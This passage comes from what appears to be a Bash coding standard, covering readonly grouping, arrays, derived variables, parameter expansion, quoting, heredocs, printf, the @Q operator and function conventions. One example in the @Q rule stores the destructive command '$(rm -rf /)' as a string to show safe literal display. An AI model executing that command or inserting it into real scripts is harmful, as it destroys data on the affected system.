    -n) DRY_RUN=1 ;;
    --output) noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    --prefix) noarg "$@"; shift; PREFIX=$1 ;;
  esac; shift; done

  # Step 3 - Make readonly AFTER parsing complete
  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX

  # Now safe to use - all readonly
  ((VERBOSE)) && info "Using prefix: $PREFIX" ||:
}
```

**Exception - Script Metadata:** Use `declare -r` for VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME (see BCS0103). Other groups (colors, paths, config) use readonly-after-group.

**Variable Groups:**

**1. Script metadata (uses declare -r):**
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**2. Color definitions:**
```bash
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC
```

**3. Path constants:**
```bash
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share/myapp
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**4. Configuration defaults:**
```bash
DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
MAX_FILE_SIZE=104857600  # 100MB
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES MAX_FILE_SIZE
```

**Anti-patterns:**

```bash
# ✗ Wrong - making readonly before all values set
PREFIX=/usr/local
readonly -- PREFIX  # Premature!
BIN_DIR="$PREFIX"/bin  # If this fails, inconsistent protection

# ✓ Correct - all values set, then all readonly
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

# ✗ Wrong - forgetting -- separator
readonly PREFIX BIN_DIR  # Risky if variable name starts with -

# ✓ Correct - always use -- separator
readonly -- PREFIX BIN_DIR

# ✗ Wrong - mixing unrelated variables
CONFIG_FILE=config.conf
VERBOSE=1
PREFIX=/usr/local
readonly -- CONFIG_FILE VERBOSE PREFIX  # Not a logical group!

# ✗ Wrong - readonly inside conditional
if [[ -f config.conf ]]; then
  CONFIG_FILE=config.conf
  readonly -- CONFIG_FILE
fi
# CONFIG_FILE might not be readonly if condition is false!

# ✓ Correct - initialize with default, then readonly
CONFIG_FILE=${CONFIG_FILE:-config.conf}
readonly -- CONFIG_FILE
```

**Edge Cases:**

**Derived variables** - initialize in dependency order:
```bash
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**Arrays:**
```bash
declare -a REQUIRED_COMMANDS=(git make tar)
declare -a OPTIONAL_COMMANDS=(md2ansi pandoc)
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS
```

**Delayed readonly (after argument parsing):**
```bash
declare -i VERBOSE=0 DRY_RUN=0
declare -- CONFIG_FILE='' LOG_FILE=''

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -c|--config)  noarg "$@"; shift; CONFIG_FILE=$1 ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE
}
```

**Testing readonly status:**
```bash
readonly -p 2>/dev/null | grep -q "VERSION" && echo 'readonly'
readonly -p  # List all readonly variables
```

**When NOT to use readonly:**
```bash
# Don't make readonly if value changes during execution
declare -i count=0  # Modified in loops

# Only make readonly when value is final
[[ -n "$config_file" ]] && readonly -- config_file
```

**Key principle:** Separate initialization from protection. Group related variables together. Always use `--` separator. Make readonly as soon as values are final.


---


**Rule: BCS0206**

## Readonly Declaration

Use `readonly` for constants to prevent accidental modification.

```bash
readonly -a REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
readonly -- SCRIPT_PATH=$(realpath -- "$0")
```


---


**Rule: BCS0207**

## Arrays

**Rule: BCS0207** (Merged from BCS0501 + BCS0502)

Array declaration, usage, and safe list handling.

---

#### Rationale

Arrays provide element preservation (boundaries maintained regardless of content), no word splitting with `"${array[@]}"`, glob safety (wildcards preserved literally), and safe command construction with arbitrary arguments.

---

#### Declaration

```bash
declare -a paths=()           # Empty indexed array
declare -a colors=(red green blue)
local -a found_files=()       # Local arrays in functions
declare -A config=()          # Associative arrays (Bash 4.0+)
config['key']='value'
```

#### Adding Elements

```bash
paths+=("$1")                        # Append single element
args+=("$arg1" "$arg2" "$arg3")      # Append multiple
all_files+=("${config_files[@]}")    # Append another array
```

#### Iteration

```bash
# ✓ Correct - quoted expansion, handles spaces
for path in "${paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${paths[@]}; do
```

#### Length and Checking

```bash
count=${#files[@]}                    # Get number of elements
if ((${#array[@]} == 0)); then        # Check if empty
  info 'Array is empty'
fi
((${#paths[@]})) || paths=('.')       # Set default if empty
```

#### Reading Into Arrays

```bash
IFS=',' read -ra fields <<< "$csv_line"      # Split by delimiter
readarray -t lines < <(grep pattern file)    # From command (preferred)
mapfile -t files < <(find . -name "*.txt")
readarray -t config_lines < config.txt       # From file
```

#### Element Access

```bash
first=${array[0]}           # Single element (0-indexed)
last=${array[-1]}           # Bash 4.3+
"${array[@]}"               # All elements as separate words
"${array[*]}"               # All as single word (rare)
"${array[@]:2}"             # Slice from index 2
"${array[@]:1:3}"           # 3 elements from index 1
```

---

#### Safe Command Construction

```bash
local -a cmd=(myapp '--config' "$config_file")
((verbose)) && cmd+=('--verbose') ||:
[[ -z "$output" ]] || cmd+=('--output' "$output")
"${cmd[@]}"                 # Execute safely
```

#### Collecting Arguments During Parsing

```bash
declare -a input_files=()
while (($#)); do
  case $1 in
    -*)  handle_option "$1" ;;
    *)   input_files+=("$1") ;;
  esac
  shift
done
for file in "${input_files[@]}"; do
  process_file "$file"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted expansion
rm ${files[@]}
# ✓ Correct
rm "${files[@]}"

# ✗ Wrong - word splitting to create array
array=($string)
# ✓ Correct
readarray -t array <<< "$string"

# ✗ Wrong - using [*] in iteration
for item in "${array[*]}"; do
# ✓ Correct
for item in "${array[@]}"; do
```

---

#### Operator Summary

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.

#fin


---


**Rule: BCS0208**

## Reserved for Future Use

**Rule: BCS0208**

---

Reserved placeholder for Variables & Data Types section expansion.

#### Purpose

- Maintains numerical sequence integrity (two-digit patterns)
- Allows future additions without code renumbering
- Prevents external reference conflicts

#### Possible Future Topics

- Nameref variables (`declare -n`)
- Indirect variable expansion (`${!var}`)
- Variable attributes and introspection
- Typed variable best practices

---

**Status:** Reserved | Do not use in documentation or compliance checking.

#fin


---


**Rule: BCS0209**

## Derived Variables

**Derived variables are computed from base variables for paths, configs, or composite values. Group them with section comments explaining dependencies. When base variables change (during argument parsing), update all derived variables. This implements DRY at the configuration level.**

**Rationale:**
- Single source of truth for base values; derived everywhere else
- When PREFIX changes, all paths update automatically
- Section comments make variable relationships obvious
- Prevents subtle bugs from stale derived values

**Simple derived variables:**

```bash
# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME"/."$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- CACHE_DIR="$HOME"/.cache/"$APP_NAME"
```

**XDG Base Directory with environment fallbacks:**

```bash
# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE=${XDG_CONFIG_HOME:-$HOME/.config}
declare -- CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE=${XDG_DATA_HOME:-$HOME/.local/share}
declare -- DATA_DIR="$DATA_BASE"/"$APP_NAME"

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE=${XDG_CACHE_HOME:-$HOME/.cache}
declare -- CACHE_DIR="$CACHE_BASE"/"$APP_NAME"
```

**Updating derived variables when base changes:**

```bash
declare -- PREFIX=/usr/local
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"
  info "Updated paths for PREFIX=${PREFIX@Q}"
}

main() {
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX=$1
        update_derived_paths  # IMPORTANT: Update all derived paths
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX BIN_DIR LIB_DIR DOC_DIR
}
```

**Complex derivations with multiple dependencies:**

```bash
declare -- ENVIRONMENT=production
declare -- REGION=us-east
declare -- APP_NAME=myapp

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# Paths that depend on environment
declare -- CONFIG_DIR="/etc/$APP_NAME/$ENVIRONMENT"
declare -- CONFIG_FILE="$CONFIG_DIR/config-$REGION.conf"

# Derived URLs
declare -- API_HOST="api-$ENVIRONMENT.example.com"
declare -- API_URL="https://$API_HOST/v1"
```

**Anti-patterns:**

```bash
# ✗ Wrong - duplicating values instead of deriving
PREFIX=/usr/local
BIN_DIR=/usr/local/bin        # Duplicates PREFIX!

# ✓ Correct - derive from base value
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin

# ✗ Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      PREFIX=$1
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

# ✓ Correct - update derived variables
main() {
  case $1 in
    --prefix)
      PREFIX=$1
      BIN_DIR="$PREFIX"/bin     # Update derived
      LIB_DIR="$PREFIX"/lib
      ;;
  esac
}

# ✗ Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX"/bin
readonly -- BIN_DIR             # Can't update if PREFIX changes!

# ✓ Correct - make readonly after all values set
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR      # Now make readonly

# ✗ Wrong - inconsistent derivation
CONFIG_DIR=/etc/myapp                  # Hardcoded
LOG_DIR=/var/log/"$APP_NAME"           # Derived - inconsistent!

# ✓ Correct - consistent derivation
CONFIG_DIR=/etc/"$APP_NAME"
LOG_DIR=/var/log/"$APP_NAME"

# ✗ Wrong - circular dependency
VAR1="$VAR2"
VAR2="$VAR1"                           # Circular!

# ✓ Correct - clear dependency chain
BASE='value'
DERIVED1="$BASE"/path1
DERIVED2="$BASE"/path2
```

**Edge cases:**

**1. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == development ]]; then
  CONFIG_DIR="$SCRIPT_DIR"/config
  LOG_DIR="$SCRIPT_DIR"/logs
else
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR"/config.conf
```

**2. Hardcoded exceptions with documentation:**

```bash
# Most paths derived from PREFIX
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
LIB_DIR="$PREFIX"/lib

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR=/etc/profile.d           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR"/"$APP_NAME".sh
```

**3. Multiple update functions for large scripts:**

```bash
update_prefix_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
}

update_app_paths() {
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths
  CONFIG_FILE="$CONFIG_DIR"/config.conf
}
```

**Summary:**
- Group derived variables with section comments explaining dependencies
- Derive from base values - never duplicate, always compute
- Update when base changes - especially during argument parsing
- Document hardcoded exceptions that don't derive
- Use `${XDG_VAR:-$HOME/default}` for environment fallbacks
- Make readonly last - after all parsing complete
- Clear dependency chain: base �' derived1 �' derived2


---


**Rule: BCS0210**

## Parameter Expansion & Braces Usage

**Rule: BCS0210**

Use `"$var"` as default; add braces `"${var}"` only when syntactically required.

---

#### Parameter Expansion Operations

```bash
# Pattern removal
SCRIPT_NAME=${SCRIPT_PATH##*/}  # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}    # Remove shortest suffix pattern

# Default values
${var:-default}                 # Use default if unset or null
${var:=default}                 # Set default if unset or null
${var:+alternate}               # Use alternate if set and non-null

# Substrings
${var:0:5}                      # First 5 characters
${var:(-3)}                     # Last 3 characters

# Pattern substitution
${var//old/new}                 # Replace all occurrences
${var/old/new}                  # Replace first occurrence
${var/#pattern/replace}         # Replace prefix
${var/%pattern/replace}         # Replace suffix

# Case conversion (Bash 4.0+)
${var,,}                        # All lowercase
${var^^}                        # All uppercase
${var~}                         # Toggle first char
${var~~}                        # Toggle all chars

# Special parameters
"${@:2}"                        # All args from 2nd onwards
"${10}"                         # Positional param > 9
${#var}                         # String length
${!prefix@}                     # Variables starting with prefix
```

---

#### When Braces Are REQUIRED

1. **Parameter expansion operations:** `"${var##*/}"`, `"${var:-default}"`, `"${var:0:5}"`, `"${var//old/new}"`, `"${var,,}"`

2. **Variable concatenation (no separator):** `"${var1}${var2}"`, `"${prefix}suffix"`

3. **Array access:** `"${array[index]}"`, `"${array[@]}"`, `"${#array[@]}"`

4. **Special parameter expansion:** `"${@:2}"`, `"${10}"`, `"${!var}"`

---

#### When Braces Are NOT Required

```bash
# ✓ Correct - standalone variables
"$var"  "$HOME"  "$SCRIPT_DIR"

# ✓ Correct - separators delimit naturally
"$PREFIX"/bin
"$PREFIX/bin"
echo "Installing to $PREFIX/bin"

# ✗ Wrong - unnecessary braces
"${var}"  "${HOME}"  "${PREFIX}"/bin
```

---

#### Edge Cases

```bash
# Braces required - alphanumeric follows without separator
"${var}_suffix"      # Prevents $var_suffix
"${prefix}123"       # Prevents $prefix123

# No braces needed - separator present
"$var-suffix"        # Dash separates
"$var.suffix"        # Dot separates
"$var/path"          # Slash separates
```

---

#### Summary

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no sep) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |

**Key Principle:** Use `"$var"` by default. Only add braces when required for correct parsing.

#fin


---


**Rule: BCS0211**

## Boolean Flags Pattern

Use integer variables with `declare -i` or `local -i` for boolean state:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0
declare -i NON_INTERACTIVE=0
declare -i UNINSTALL=0
declare -i DRY_RUN=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` (true for non-zero, false for zero)
- Keep boolean flags separate from integer counters


---


**Rule: BCS0300**

# Strings & Quoting

Core quoting rules preventing word-splitting errors: **single quotes** for static strings, **double quotes** for variable expansion.

**7 Rules:**

1. **Quoting Fundamentals** (BCS0301) - Static vs. dynamic strings
2. **Command Substitution** (BCS0302) - Quoting `$(...)` results
3. **Quoting in Conditionals** (BCS0303) - Variable quoting in `[[ ]]`
4. **Here Documents** (BCS0304) - Delimiter quoting for heredocs
5. **printf Patterns** (BCS0305) - Format string and argument quoting
6. **Parameter Quoting** (BCS0306) - `${param@Q}` for safe display
7. **Anti-Patterns** (BCS0307) - Common quoting mistakes

**Key principle:** Single quotes = "literal text"; double quotes = "expansion needed."


---


**Rule: BCS0301**

## Quoting Fundamentals

**Rule: BCS0301**

Core quoting rules for strings, variables, and literals.

---

#### The Fundamental Rule

**Single quotes** for static strings, **double quotes** when variable expansion needed.

```bash
# ✓ Single quotes for static
info 'Checking prerequisites...'
[[ "$status" == 'success' ]]

# ✓ Double quotes for variables
info "Found $count files"
die 1 "File '$SCRIPT_DIR/testfile' not found"
```

---

#### Why Single Quotes for Static Strings

1. **Performance**: No variable/escape parsing
2. **Clarity**: Signals literal text, no substitution
3. **Safety**: `$`, `` ` ``, `\` are literal—prevents accidental expansion

```bash
msg='The variable $PATH will not expand'
regex='^\$[0-9]+\.[0-9]{2}$'
```

---

#### Mixed Quoting Pattern

Nest single quotes inside double quotes for literal display:

```bash
die 1 "Unknown option '$1'"
warn "Cannot access '$file_path'"
```

---

#### One-Word Literal Exception

Simple alphanumeric values (`a-zA-Z0-9_-./`) may be unquoted:

```bash
# ✓ Acceptable
STATUS=success
[[ "$level" == INFO ]]

# ✓ Better - quote for consistency
STATUS='success'
[[ "$level" == 'INFO' ]]
```

**Mandatory quoting:** spaces, special characters (`@`, `*`), empty strings `''`, values with `$`/quotes/backslashes.

---

#### Anti-Patterns

```bash
# ✗ Wrong - double quotes for static strings
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]
```

```bash
# ✗ Wrong - special characters unquoted
EMAIL=user@domain.com
PATTERN=*.log

# ✓ Correct
EMAIL='user@domain.com'
PATTERN='*.log'
```

---

#### Path Concatenation Quoting

Quote variable portions separately from literals:

```bash
# ✓ RECOMMENDED - separate quoting
"$PREFIX"/bin
"$SCRIPT_DIR"/data/"$filename"
[[ -f "$CONFIG_DIR"/hosts.conf ]]

# ACCEPTABLE - combined
"$PREFIX/bin"
"$dir/$file"
```

**Rationale:** Makes variable boundaries visually explicit; improves readability in complex paths.

---

#### Quick Reference

| Content | Quote Type | Example |
|---------|------------|---------|
| Static text | Single | `'Processing...'` |
| With variable | Double | `"Found $count files"` |
| Variable in quotes | Mixed | `"Option '$1' invalid"` |
| One-word literal | Optional | `STATUS=success` |
| Special chars | Single | `'user@example.com'` |
| Empty string | Single | `VAR=''` |
| Path with separator | Separate | `"$var"/path` |

**Key principle:** Single quotes as default; double quotes only when expansion needed.

#fin


---


**Rule: BCS0302**

## Command Substitution

**Rule: BCS0302**

Use double quotes when strings include command substitution. Always quote results to preserve whitespace and prevent word splitting.

```bash
# ✓ Correct - double quotes for command substitution
echo "Current time: $(date +%T)"
info "Found $(wc -l < "$file") lines"
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"
TIMESTAMP="$(date -Ins)"

# ✓ Correct - quoted result
result=$(command)
echo "$result"

# ✗ Wrong - unquoted result causes word splitting
echo $result
```

#fin


---


**Rule: BCS0303**

## Quoting in Conditionals

**Rule: BCS0303**

**Always quote variables** in conditionals. Static comparison values follow normal rules (single quotes for literals).

```bash
# ✓ Correct - variable quoted
[[ -f "$file" ]]
[[ "$name" == 'value' ]]
[[ "$count" -eq 0 ]]

# ✗ Wrong - unquoted variable
[[ -f $file ]]
[[ $name == value ]]
```

---

#### Rationale

- **Word splitting**: `$file` with spaces becomes multiple arguments
- **Glob expansion**: `$file` with `*` expands to matching files
- **Empty values**: Unquoted empty variables cause syntax errors
- **Security**: Prevents injection attacks

---

#### Common Patterns

```bash
# File tests
[[ -f "$file" ]]
[[ -d "$directory" && -r "$directory" ]]

# String comparisons (variable quoted, literal single-quoted)
[[ "$action" == 'start' ]]
[[ -z "$value" ]]

# Numeric comparisons
declare -i count=0
((count > 10))

# Pattern matching (pattern unquoted for globbing)
[[ "$filename" == *.txt ]]        # Glob match
[[ "$filename" == '*.txt' ]]      # Literal match

# Regex (pattern variable unquoted)
pattern='^[0-9]+$'
[[ "$input" =~ $pattern ]]        # ✓ Pattern unquoted
[[ "$input" =~ "$pattern" ]]      # ✗ Becomes literal
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]]              # Breaks with spaces

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct
[[ "$mode" == 'production' ]]
[[ "$mode" == production ]]  # One-word literal OK
```

---

**Key principle:** Quote all variables in conditionals: `[[ -f "$file" ]]`.

#fin


---


**Rule: BCS0304**

## Here Documents

**Rule: BCS0304**

Quoting rules for here documents.

---

#### Delimiter Quoting

| Delimiter | Variable Expansion | Use Case |
|-----------|-------------------|----------|
| `<<EOF` | Yes | Dynamic content with variables |
| `<<'EOF'` | No | Literal content (JSON, SQL) |
| `<<"EOF"` | No | Same as single quotes |

---

#### With Variable Expansion

```bash
cat <<EOF
User: $USER
Home: $HOME
Time: $(date)
EOF
```

---

#### Literal Content (No Expansion)

```bash
cat <<'EOF'
{
  "name": "$APP_NAME",
  "version": "$VERSION"
}
EOF
```

---

#### Indented Content

```bash
# <<- removes leading tabs (not spaces)
if condition; then
	cat <<-EOF
	Indented content
	Aligned with code
	EOF
fi
```

---

#### Anti-Pattern

```bash
# ✗ Wrong - unquoted when literal needed (SQL injection risk)
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal SQL
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

**Key principle:** Quote delimiter (`<<'EOF'`) to prevent expansion; leave unquoted for variable substitution.

#fin


---


**Rule: BCS0305**

## printf Patterns

**Rule: BCS0305**

Quoting rules for printf and echo.

---

#### Basic Pattern

```bash
# Format string: single quotes (static)
# Variables: double-quoted as arguments
printf '%s: %d files found\n' "$name" "$count"

# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
printf 'Found %d files in %s\n' "$count" "$dir"
```

---

#### Format String Escapes

```bash
printf '%s\n'   "$string"       # String
printf '%d\n'   "$integer"      # Decimal
printf '%f\n'   "$float"        # Float
printf '%x\n'   "$hex"          # Hexadecimal
printf '%%\n'                   # Literal %
```

---

#### Prefer printf Over echo -e

```bash
# ✗ Avoid - echo -e behavior varies
echo -e "Line1\nLine2"

# ✓ Prefer - printf is consistent
printf 'Line1\nLine2\n'

# Or use $'...' for escape sequences
echo $'Line1\nLine2'
```

---

**Key principle:** Single quotes for format strings, double quotes for variable arguments.

#fin


---


**Rule: BCS0306**

## Parameter Quoting with @Q

**Rule: BCS0306**

`${parameter@Q}` expands to a shell-quoted value safe for display and re-use.

---

#### The @Q Operator

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)' (safe, literal)
```

---

#### Primary Use: Error Messages

```bash
# ✗ Wrong - injection risk
die 2 "Unknown option $1"
die 2 "Unknown option '$1'"

# ✓ Correct - safe display
die 2 "Unknown option ${1@Q}"

# Validation function
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

---

#### Dry-Run Display

```bash
run_command() {
  local -a cmd=("$@")
  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi
  "${cmd[@]}"
}
```

---

#### Comparison

| Input | `$var` | `"$var"` | `${var@Q}` |
|-------|--------|----------|------------|
| `hello world` | splits | `hello world` | `'hello world'` |
| `$(date)` | executes | executes | `'$(date)'` |
| `*.txt` | globs | `*.txt` | `'*.txt'` |

---

#### When to Use

**Use @Q for:** Error messages, logging user input, dry-run output

**Don't use @Q for:** Normal variable expansion, comparisons

**Key principle:** Use `${parameter@Q}` when displaying user input in error messages to prevent injection.

#fin


---


**Rule: BCS0307**

## Quoting Anti-Patterns

**Rule: BCS0307**

Common quoting mistakes to avoid.

---

#### Category 1: Double Quotes for Static Strings

```bash
# ✗ Wrong
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]
```

---

#### Category 2: Unquoted Variables

```bash
# ✗ Wrong - word splitting/glob expansion
[[ -f $file ]]
echo $result

# ✓ Correct
[[ -f "$file" ]]
echo "$result"
```

---

#### Category 3: Unnecessary Braces

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"

# ✓ Correct
echo "$HOME"/bin

# Braces ARE needed for:
"${var:-default}"     # Default value
"${file##*/}"         # Parameter expansion
"${array[@]}"         # Array expansion
"${var1}${var2}"      # Adjacent variables
```

---

#### Category 4: Unquoted Arrays

```bash
# ✗ Wrong
for item in ${items[@]}; do

# ✓ Correct
for item in "${items[@]}"; do
```

---

#### Category 5: Glob Expansion Danger

```bash
pattern='*.txt'

# ✗ Wrong
echo $pattern       # Expands to all .txt files!

# ✓ Correct
echo "$pattern"     # Outputs literal: *.txt
```

---

#### Category 6: Here-doc Delimiter

```bash
# ✗ Wrong - variables expand unexpectedly
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal content
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

#### Quick Reference

| Context | Correct | Wrong |
|---------|---------|-------|
| Static string | `'literal'` | `"literal"` |
| Variable | `"$var"` | `$var` |
| Path with var | `"$HOME"/bin` | `"${HOME}/bin"` |
| Array | `"${arr[@]}"` | `${arr[@]}` |

**Key principle:** Single quotes for static text, double quotes for variables, avoid unnecessary braces, always quote variables.

#fin


---


**Rule: BCS0400**

# Functions

Function definition patterns, naming (lowercase_with_underscores), and organization. Mandates `main()` for scripts >200 lines for structure/testability. Use `declare -fx` for sourceable library exports. Remove unused utilities in production. Organize bottom-up: messaging �' helpers �' business logic �' `main()` (ensures safe call ordering and reader comprehension).


---


**Rule: BCS0401**

## Function Definition Pattern

```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```

**Key Points:**
- Single-line format for simple one-expression functions
- Multi-line with proper indentation for complex functions
- Declare locals at function start with `local -i` (integers) or `local --` (strings)
- Use `return "$exitcode"` for explicit exit status


---


**Rule: BCS0402**

## Function Names
Use lowercase with underscores; prefix private functions with underscore.

```bash
# ✓ Good - lowercase with underscores
my_function() {
  …
}

process_log_file() {
  …
}

# ✓ Private functions use leading underscore
_my_private_function() {
  …
}

_validate_input() {
  …
}

# ✗ Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  …
}

PROCESS_FILE() {    # Don't do this
  …
}
```

**Rationale:** Matches Unix naming conventions; avoids confusion with variables; underscore prefix signals internal-only use.

**Anti-patterns:**
```bash
# ✗ Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

# ✓ If you must wrap built-ins, use a different name
change_dir() {
  builtin cd "$@" && ls
}

# ✗ Don't use special characters
my-function() {  # Dash creates issues in some contexts
  …
}
```


---


**Rule: BCS0403**

## Main Function

**Always include a `main()` function for scripts longer than ~200 lines. Serves as single entry point for organization, testability, and maintainability. Place `main "$@"` at bottom before `#fin`.**

**Rationale:**
- Single entry point with clear execution flow
- Testable: source without executing, test functions individually
- Scope control: locals in main prevent global namespace pollution
- Centralized exit code handling and debugging

**When to use main():**
```bash
# Use main() when:
# - Script > ~200 lines, multiple functions, argument parsing, complex flow
# Can skip main() when:
# - Trivial script (< 200 lines), simple wrapper, no functions, linear
```

**Basic main() structure:**
```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ... helper functions ...

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) usage; return 0 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  # Main logic
  info 'Starting processing...'
  return 0
}

main "$@"
#fin
